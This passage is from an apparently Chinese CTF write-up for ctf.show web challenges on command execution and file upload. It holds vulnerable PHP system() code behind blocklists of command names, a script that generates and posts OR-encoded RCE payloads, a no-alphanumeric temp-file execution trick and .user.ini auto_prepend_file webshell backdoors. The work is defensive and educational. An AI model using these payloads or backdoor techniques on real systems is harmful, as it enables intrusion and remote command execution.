class="line">		<span class="keyword">if</span>(preg_match($preg, hex2bin($hex_i))||preg_match($preg, hex2bin($hex_j)))&#123;</span><br><span class="line">			<span class="keyword">echo</span> <span class="string">''</span>;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">else</span>&#123;</span><br><span class="line">			$a = <span class="string">'%'</span>.$hex_i;</span><br><span class="line">			$b = <span class="string">'%'</span>.$hex_j;</span><br><span class="line">			$c = (urldecode($a) | urldecode($b));</span><br><span class="line">			<span class="keyword">if</span> (ord($c)&gt;=<span class="number">32</span>&amp;ord($c)&lt;=<span class="number">126</span>)</span><br><span class="line">			&#123;</span><br><span class="line">				$contents=$contents.$c.<span class="string">" "</span>.$a.<span class="string">" "</span>.$b.<span class="string">"\n"</span>;</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">		</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line">fwrite($myfile, $contents);</span><br><span class="line">fclose($myfile);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></div>
</li>
<li><p><strong>python跑一下脚本</strong></p>
</li>
</ul>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PYTHON"><figure class="iseeu highlight /python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> urllib</span><br><span class="line"><span class="keyword">from</span> sys <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line">os.system(<span class="string">"php rce_or.php"</span>)  <span class="comment"># 执行shell语句</span></span><br><span class="line"><span class="keyword">if</span> (len(argv) != <span class="number">2</span>):</span><br><span class="line">    print(len(argv))</span><br><span class="line">    print(argv)</span><br><span class="line">    print(argv[<span class="number">0</span>:<span class="number">2</span>])</span><br><span class="line">    print(<span class="string">"="</span> * <span class="number">50</span>)</span><br><span class="line">    print(<span class="string">'USER：python exp.py &lt;url&gt;'</span>)</span><br><span class="line">    print(<span class="string">"eg：  python exp.py http://ctf.show/"</span>)</span><br><span class="line">    print(<span class="string">"="</span> * <span class="number">50</span>)</span><br><span class="line">    exit(<span class="number">0</span>)</span><br><span class="line">url = argv[<span class="number">1</span>]</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">action</span><span class="params">(arg)</span>:</span></span><br><span class="line">    s1 = <span class="string">""</span></span><br><span class="line">    s2 = <span class="string">""</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> arg:</span><br><span class="line">        f = open(<span class="string">"rce_or.txt"</span>, <span class="string">"r"</span>)</span><br><span class="line">        <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">            t = f.readline()</span><br><span class="line">            <span class="keyword">if</span> t == <span class="string">""</span>:</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">            <span class="keyword">if</span> t[<span class="number">0</span>] == i:</span><br><span class="line">                <span class="comment"># print(i)</span></span><br><span class="line">                s1 += t[<span class="number">2</span>:<span class="number">5</span>]</span><br><span class="line">                s2 += t[<span class="number">6</span>:<span class="number">9</span>]</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">        f.close()</span><br><span class="line">    output = <span class="string">"(\""</span> + s1 +<span class="string">"\"|\""</span> + s2 + <span class="string">"\")"</span></span><br><span class="line">    <span class="keyword">return</span> (output)</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    param = action(input(<span class="string">"Your function :  "</span>)) + action(input(<span class="string">"Your command:  "</span>))</span><br><span class="line">    print(<span class="string">"Your payload: "</span>+param);</span><br><span class="line">    data = &#123;</span><br><span class="line">        <span class="string">'c'</span>: urllib.parse.unquote(param)</span><br><span class="line">    &#125;</span><br><span class="line">    print(data)</span><br><span class="line">    r = requests.post(url , data=data)</span><br><span class="line">    print(<span class="string">"result: "</span>+r.text)</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>

<p><img src="https://gitee.com/gylq/cloudimages/raw/master/img/image-20210717150405707.png" alt="image-20210717150405707"></p>
</blockquote>
<h2 id="web42"><a href="#web42" class="headerlink" title="web42"></a>web42</h2><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PHP"><figure class="iseeu highlight /php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'c'</span>]))&#123;</span><br><span class="line">    $c=$_GET[<span class="string">'c'</span>];</span><br><span class="line">    system($c.<span class="string">" &gt;/dev/null 2&gt;&amp;1"</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br></pre></td></tr></table></figure></div>

<blockquote>
<p><img src="https://gitee.com/gylq/cloudimages/raw/master/img/image-20210717151636427.png" alt=""></p>
</blockquote>
<h2 id="web43"><a href="#web43" class="headerlink" title="web43"></a>web43</h2><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PHP"><figure class="iseeu highlight /php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'c'</span>]))&#123;</span><br><span class="line">    $c=$_GET[<span class="string">'c'</span>];</span><br><span class="line">    <span class="keyword">if</span>(!preg_match(<span class="string">"/\;|cat/i"</span>, $c))&#123;</span><br><span class="line">        system($c.<span class="string">" &gt;/dev/null 2&gt;&amp;1"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>



<blockquote>
<p><img src="https://gitee.com/gylq/cloudimages/raw/master/img/image-20210717152049686.png" alt="image-20210717152049686"></p>
</blockquote>
<h2 id="web44"><a href="#web44" class="headerlink" title="web44"></a>web44</h2><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PHP"><figure class="iseeu highlight /php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'c'</span>]))&#123;</span><br><span class="line">    $c=$_GET[<span class="string">'c'</span>];</span><br><span class="line">    <span class="keyword">if</span>(!preg_match(<span class="string">"/;|cat|flag/i"</span>, $c))&#123;</span><br><span class="line">        system($c.<span class="string">" &gt;/dev/null 2&gt;&amp;1"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br></pre></td></tr></table></figure></div>

<blockquote>
<p><img src="https://gitee.com/gylq/cloudimages/raw/master/img/image-20210717152655692.png" alt="image-20210717152655692"></p>
</blockquote>
<h2 id="web45"><a href="#web45" class="headerlink" title="web45"></a>web45</h2><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PHP"><figure class="iseeu highlight /php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'c'</span>]))&#123;</span><br><span class="line">    $c=$_GET[<span class="string">'c'</span>];</span><br><span class="line">    <span class="keyword">if</span>(!preg_match(<span class="string">"/\;|cat|flag| /i"</span>, $c))&#123;</span><br><span class="line">        system($c.<span class="string">" &gt;/dev/null 2&gt;&amp;1"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<blockquote>
<p><img src="https://gitee.com/gylq/cloudimages/raw/master/img/image-20210717153219160.png" alt="image-20210717153219160"></p>
</blockquote>
<h2 id="web46"><a href="#web46" class="headerlink" title="web46"></a>web46</h2><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PHP"><figure class="iseeu highlight /php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'c'</span>]))&#123;</span><br><span class="line">    $c=$_GET[<span class="string">'c'</span>];</span><br><span class="line">    <span class="keyword">if</span>(!preg_match(<span class="string">"/\;|cat|flag| |[0-9]|\\$|\*/i"</span>, $c))&#123;</span><br><span class="line">        system($c.<span class="string">" &gt;/dev/null 2&gt;&amp;1"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<blockquote>
<p><img src="https://gitee.com/gylq/cloudimages/raw/master/img/image-20210717183425122.png" alt="image-20210717183425122"></p>
</blockquote>
<h2 id="web47"><a href="#web47" class="headerlink" title="web47"></a>web47</h2><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PHP"><figure class="iseeu highlight /php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'c'</span>]))&#123;</span><br><span class="line">    $c=$_GET[<span class="string">'c'</span>];</span><br><span class="line">    <span class="keyword">if</span>(!preg_match(<span class="string">"/\;|cat|flag| |[0-9]|\\$|\*|more|less|head|sort|tail/i"</span>, $c))&#123;</span><br><span class="line">        system($c.<span class="string">" &gt;/dev/null 2&gt;&amp;1"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>



<blockquote>
<p><img src="https://gitee.com/gylq/cloudimages/raw/master/img/image-20210717183713606.png" alt="image-20210717183713606"></p>
</blockquote>
<h2 id="web48"><a href="#web48" class="headerlink" title="web48"></a>web48</h2><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PHP"><figure class="iseeu highlight /php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'c'</span>]))&#123;</span><br><span class="line">    $c=$_GET[<span class="string">'c'</span>];</span><br><span class="line">    <span class="keyword">if</span>(!preg_match(<span class="string">"/\;|cat|flag| |[0-9]|\\$|\*|more|less|head|sort|tail|sed|cut|awk|strings|od|curl|\`/i"</span>, $c))&#123;</span><br><span class="line">        system($c.<span class="string">" &gt;/dev/null 2&gt;&amp;1"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>



<blockquote>
<p><img src="https://gitee.com/gylq/cloudimages/raw/master/img/image-20210717183954397.png" alt="image-20210717183954397"></p>
</blockquote>
<h2 id="web49"><a href="#web49" class="headerlink" title="web49"></a>web49</h2><blockquote>
<p><img src="https://gitee.com/gylq/cloudimages/raw/master/img/image-20210717184223954.png" alt="image-20210717184223954"></p>
</blockquote>
<h2 id="web50"><a href="#web50" class="headerlink" title="web50"></a>web50</h2><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PHP"><figure class="iseeu highlight /php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'c'</span>]))&#123;</span><br><span class="line">    $c=$_GET[<span class="string">'c'</span>];</span><br><span class="line">    <span class="keyword">if</span>(!preg_match(<span class="string">"/\;|cat|flag| |[0-9]|\\$|\*|more|less|head|sort|tail|sed|cut|awk|strings|od|curl|\`|\%|\x09|\x26/i"</span>, $c))&#123;</span><br><span class="line">        system($c.<span class="string">" &gt;/dev/null 2&gt;&amp;1"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<blockquote>
<p><img src="https://gitee.com/gylq/cloudimages/raw/master/img/image-20210717190209066.png" alt="image-20210717190209066"></p>
</blockquote>
<h2 id="web51"><a href="#web51" class="headerlink" title="web51"></a>web51</h2><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PHP"><figure class="iseeu highlight /php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'c'</span>]))&#123;</span><br><span class="line">    $c=$_GET[<span class="string">'c'</span>];</span><br><span class="line">    <span class="keyword">if</span>(!preg_match(<span class="string">"/\;|cat|flag| |[0-9]|\\$|\*|more|less|head|sort|tail|sed|cut|tac|awk|strings|od|curl|\`|\%|\x09|\x26/i"</span>, $c))&#123;</span><br><span class="line">        system($c.<span class="string">" &gt;/dev/null 2&gt;&amp;1"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<blockquote>
<p><img src="https://gitee.com/gylq/cloudimages/raw/master/img/image-20210717190620917.png" alt="image-20210717190620917"></p>
</blockquote>
<h2 id="web52"><a href="#web52" class="headerlink" title="web52"></a>web52</h2><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PHP"><figure class="iseeu highlight /php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'c'</span>]))&#123;</span><br><span class="line">    $c=$_GET[<span class="string">'c'</span>];</span><br><span class="line">    <span class="keyword">if</span>(!preg_match(<span class="string">"/\;|cat|flag| |[0-9]|\*|more|less|head|sort|tail|sed|cut|tac|awk|strings|od|curl|\`|\%|\x09|\x26|\&gt;|\&lt;/i"</span>, $c))&#123;</span><br><span class="line">        system($c.<span class="string">" &gt;/dev/null 2&gt;&amp;1"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>



<blockquote>
<ul>
<li><p>看一下目录</p>
<p><img src="https://gitee.com/gylq/cloudimages/raw/master/img/image-20210717194039748.png" alt="image-20210717194039748"></p>
</li>
<li><p><strong>直接看看a.txt是啥</strong></p>
<p><img src="https://gitee.com/gylq/cloudimages/raw/master/img/image-20210717194149794.png" alt="image-20210717194149794"></p>
</li>
<li><p><strong>发现有个flag文件在根目录</strong></p>
<p><img src="https://gitee.com/gylq/cloudimages/raw/master/img/image-20210717194258088.png" alt="image-20210717194258088"></p>
</li>
<li><p><strong>用nl或者ta’’c看看’’是用来过滤</strong></p>
</li>
</ul>
<p><img src="https://gitee.com/gylq/cloudimages/raw/master/img/image-20210717193603100.png" alt="image-20210717193603100"></p>
<p><img src="https://gitee.com/gylq/cloudimages/raw/master/img/image-20210717194411798.png" alt="image-20210717194411798"></p>
</blockquote>
<h2 id="web53"><a href="#web53" class="headerlink" title="web53"></a>web53</h2><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PHP"><figure class="iseeu highlight /php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'c'</span>]))&#123;</span><br><span class="line">    $c=$_GET[<span class="string">'c'</span>];</span><br><span class="line">    <span class="keyword">if</span>(!preg_match(<span class="string">"/\;|cat|flag| |[0-9]|\*|more|wget|less|head|sort|tail|sed|cut|tac|awk|strings|od|curl|\`|\%|\x09|\x26|\&gt;|\&lt;/i"</span>, $c))&#123;</span><br><span class="line">        <span class="keyword">echo</span>($c);</span><br><span class="line">        $d = system($c);</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"&lt;br&gt;"</span>.$d;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">'no'</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<blockquote>
<p><img src="https://gitee.com/gylq/cloudimages/raw/master/img/image-20210717195320225.png" alt="image-20210717195320225"></p>
</blockquote>
<h2 id="web54"><a href="#web54" class="headerlink" title="web54"></a>web54</h2><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PHP"><figure class="iseeu highlight /php"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'c'</span>]))&#123;</span><br><span class="line">    $c=$_GET[<span class="string">'c'</span>];</span><br><span class="line">    <span class="keyword">if</span>(!preg_match(<span class="string">"/\;|.*c.*a.*t.*|.*f.*l.*a.*g.*| |[0-9]|\*|.*m.*o.*r.*e.*|.*w.*g.*e.*t.*|.*l.*e.*s.*s.*|.*h.*e.*a.*d.*|.*s.*o.*r.*t.*|.*t.*a.*i.*l.*|.*s.*e.*d.*|.*c.*u.*t.*|.*t.*a.*c.*|.*a.*w.*k.*|.*s.*t.*r.*i.*n.*g.*s.*|.*o.*d.*|.*c.*u.*r.*l.*|.*n.*l.*|.*s.*c.*p.*|.*r.*m.*|\`|\%|\x09|\x26|\&gt;|\&lt;/i"</span>, $c))&#123;</span><br><span class="line">        system($c);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<blockquote>
<p><img src="https://gitee.com/gylq/cloudimages/raw/master/img/image-20210717200118282.png" alt="image-20210717200118282"></p>
<p><img src="https://gitee.com/gylq/cloudimages/raw/master/img/image-20210717200132124.png" alt="w"></p>
</blockquote>
<h2 id="web55"><a href="#web55" class="headerlink" title="web55"></a>web55</h2><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PHP"><figure class="iseeu highlight /php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'c'</span>]))&#123;</span><br><span class="line">    $c=$_GET[<span class="string">'c'</span>];</span><br><span class="line">    <span class="keyword">if</span>(!preg_match(<span class="string">"/\;|[a-z]|\`|\%|\x09|\x26|\&gt;|\&lt;/i"</span>, $c))&#123;</span><br><span class="line">        system($c);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<blockquote>
<ul>
<li><strong>bin为binary的简写，主要放置一些系统必备的执行命令，里面有base64可以试试绕过</strong></li>
</ul>
</blockquote>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="code"><pre><span class="line">?c&#x3D;&#x2F;???&#x2F;????64 ????.???  相当于 ?c&#x3D;&#x2F;bin&#x2F;base64 flag.php</span><br></pre></td></tr></table></figure></div>

<blockquote>
<p><img src="https://gitee.com/gylq/cloudimages/raw/master/img/image-20210718092438468.png" alt="image-20210718092438468"></p>
</blockquote>
<ul>
<li>解密之后就是结果</li>
</ul>
<blockquote>
<p><img src="https://gitee.com/gylq/cloudimages/raw/master/img/image-20210718092518736.png" alt="image-20210718092518736"></p>
</blockquote>
<ul>
<li>毕竟不是万能的，所以看了一下经典的p师傅上传命令执行，写一个upload.php简单的上传功能，然后利用. 来执行shell语句，<a href="https://www.leavesongs.com/PENETRATION/webshell-without-alphanum-advanced.html" target="_blank" rel="noopener">建议看看无字母数字webshell命令执行</a>了解一下原理</li>
</ul>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="HTML"><figure class="iseeu highlight /html"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span> <span class="attr">lang</span>=<span class="string">"en"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">"UTF-8"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">name</span>=<span class="string">"viewport"</span> <span class="attr">content</span>=<span class="string">"width=device-width, initial-scale=1.0"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>POST数据包POC<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">"http://9690d3da-43c1-4f75-87b3-628eff4078df.challenge.ctf.show:8080/"</span> <span class="attr">method</span>=<span class="string">"post"</span> <span class="attr">enctype</span>=<span class="string">"multipart/form-data"</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!--链接是当前打开的题目链接--&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">label</span> <span class="attr">for</span>=<span class="string">"file"</span>&gt;</span>文件名：<span class="tag">&lt;/<span class="name">label</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"file"</span> <span class="attr">name</span>=<span class="string">"file"</span> <span class="attr">id</span>=<span class="string">"file"</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"submit"</span> <span class="attr">name</span>=<span class="string">"submit"</span> <span class="attr">value</span>=<span class="string">"提交"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure></div>

<blockquote>
<ul>
<li><strong>因为php的上传文件之后，服务端并没有直接丢弃上传的文件，而是放在了/tmp/????????? 这里有九位数字可以为/tmp/phpabcabD因为正常情况最后一位都会是大写字母，利用[@-[]来确定执行范围所以构造payload（@-[是大写字母的范围可以去查ascii码）好像构造的时候.后面得加个空格或者+号也行</strong></li>
</ul>
</blockquote>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="code"><pre><span class="line">?c&#x3D;.+&#x2F;???&#x2F;????????[@-[]</span><br></pre></td></tr></table></figure></div>

<blockquote>
<ul>
<li>上传抓包</li>
</ul>
</blockquote>
<p><img src="https://gitee.com/gylq/cloudimages/raw/master/img/image-20210718100015465.png" alt="image-20210718100015465"></p>
<p><img src="https://gitee.com/gylq/cloudimages/raw/master/img/image-20210718100055211.png" alt="image-20210718100055211"></p>
<blockquote>
<ul>
<li>经此可以发现写个python代码直接上传文件，就写入cat flag.php 不用加#!bin/sh</li>
</ul>
</blockquote>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PYTHON"><figure class="iseeu highlight /python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    url = <span class="string">"http://9690d3da-43c1-4f75-87b3-628eff4078df.challenge.ctf.show:8080/?c=.+/???/????????[@-[]"</span></span><br><span class="line">    r = requests.post(url, files=&#123;<span class="string">"file"</span>: (<span class="string">'1.txt'</span>, <span class="string">'cat flag.php'</span>)&#125;)</span><br><span class="line">    <span class="keyword">if</span> r.text.find(<span class="string">"flag"</span>):</span><br><span class="line">        print(r.text)</span><br><span class="line">        <span class="keyword">break</span></span><br></pre></td></tr></table></figure></div>

<p><img src="https://gitee.com/gylq/cloudimages/raw/master/img/image-20210718100242475.png" alt="image-20210718100242475"></p>
<h2 id="web56"><a href="#web56" class="headerlink" title="web56"></a>web56</h2><blockquote>
<ul>
<li><strong>过滤的数字，但是还是不影响第二种命令执行的方法，延续上题，或者python代码跑一波</strong></li>
</ul>
</blockquote>
<p><img src="https://gitee.com/gylq/cloudimages/raw/master/img/image-20210718100624413.png" alt="image-20210718100624413"></p>
<h2 id="web57"><a href="#web57" class="headerlink" title="web57"></a>web57</h2><h1 id="文件上传"><a href="#文件上传" class="headerlink" title="文件上传"></a>文件上传</h1><h2 id="web151"><a href="#web151" class="headerlink" title="web151"></a>web151</h2><blockquote>
<ul>
<li>直接抓包改后缀名</li>
</ul>
</blockquote>
<p><img src="https://gitee.com/gylq/cloudimages/raw/master/img/image-20210721183539568.png" alt="image-20210721183539568"></p>
<h2 id="web152"><a href="#web152" class="headerlink" title="web152"></a>web152</h2><blockquote>
<ul>
<li>和上题一样</li>
</ul>
</blockquote>
<p><img src="https://gitee.com/gylq/cloudimages/raw/master/img/image-20210721183539568.png" alt=""></p>
<h2 id="web153"><a href="#web153" class="headerlink" title="web153"></a>web153</h2><ul>
<li><strong>对php后缀基本都限制了，我们构造.user.ini用户后门</strong></li>
</ul>
<blockquote>
<ul>
<li><strong>php.ini是php的一个全局配置文件，对整个web服务起作用；而.user.ini和.htaccess一样是目录的配置文件，.user.ini就是用户自定义的一个php.ini，我们可以利用这个文件来构造后门和隐藏后门。</strong></li>
</ul>
</blockquote>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="code"><pre><span class="line">auto_prepend_file&#x3D;filename      &#x2F;&#x2F;包含在文件头</span><br><span class="line">auto_append_file&#x3D;filename       &#x2F;&#x2F;包含在文件尾</span><br></pre></td></tr></table></figure></div>

<blockquote>
<ul>
<li><strong>auto_prepend_file=1.png 就相当于当前目录中所有的php文件都调用了require(‘1.png’),只要进入任意一个php文件就可以使用1.png中我们构造的一句话木马来直接getshell和命令执行。</strong></li>
</ul>
</blockquote>
<ul>
<li><strong>首先上传.user.ini文件</strong></li>
</ul>
<blockquote>
<p><img src="https://gitee.com/gylq/cloudimages/raw/master/img/image-20210723154700946.png" alt="image-20210723154700946"></p>
</blockquote>
<ul>
<li><strong>再直接上传01.png</strong></li>
</ul>
<blockquote>
<p><img src="https://gitee.com/gylq/cloudimages/raw/master/img/image-20210723154751780.png" alt="image-20210723154751780"></p>
</blockquote>
<p><img src="https://gitee.com/gylq/cloudimages/raw/master/img/image-20210723155013717.png" alt="image-20210723155013717"></p>
<blockquote>
<ul>
<li>直接拿flag</li>
</ul>
</blockquote>
<p><img src="https://gitee.com/gylq/cloudimages/raw/master/img/image-20210723155132721.png" alt="image-20210723155132721"></p>
<h2 id="web154"><a href="#web154" class="headerlink" title="web154"></a>web154</h2><blockquote>
<ul>
<li><strong>和上题一样传了个.user.ini文件进去，结果一句话木马写不进去，改用短标签代码&lt;?=就相当于echo接着双反引号执行命令要记得闭合</strong></li>
</ul>
</blockquote>
<p><img src="https://gitee.com/gylq/cloudimages/raw/master/img/image-20210723160015412.png" alt="image-20210723160015412"></p>
<p><img src="https://gitee.com/gylq/cloudimages/raw/master/img/image-20210723160118025.png" alt="image-20210723160118025"></p>
<h2 id="web155"><a href="#web155" class="headerlink" title="web155"></a>web155</h2><blockquote>
<ul>
<li>和上题一样</li>
</ul>
</blockquote>
<p><img src="https://gitee.com/gylq/cloudimages/raw/master/img/image-20210723160315690.png" alt="image-20210723160315690"></p>
<h2 id="web156"><a href="#web156" class="headerlink" title="web156"></a>web156</h2><blockquote>
<ul>
<li>和上题一样</li>
</ul>
</blockquote>
<h2 id="web157"><a href="#web157" class="headerlink" title="web157"></a>web157</h2><blockquote>
<ul>
<li>和上题一样就是分号过滤了，分号改成?&gt;</li>
</ul>
</blockquote>
<p><img src="https://gitee.com/gylq/cloudimages/raw/master/img/image-20210723161141006.png" alt="image-20210723161141006"></p>
<p><img src="https://gitee.com/gylq/cloudimages/raw/master/img/image-20210723161148481.png" alt="image-20210723161148481"></p>
<h2 id="web158"><a href="#web158" class="headerlink" title="web158"></a>web158</h2><blockquote>
<ul>
<li>和上题一样</li>
</ul>
</blockquote>
<h2 id="web159"><a href="#web159" class="headerlink" title="web159"></a>web159</h2><blockquote>
<ul>
<li>和上题一样</li>
</ul>
</blockquote>
<h2 id="web160"><a href="#web160" class="headerlink" title="web160"></a>web160</h2><blockquote>
<ul>
<li>过滤了反引号，那就文件包含，因为php被过滤了所以得用.来绕过</li>
</ul>
</blockquote>
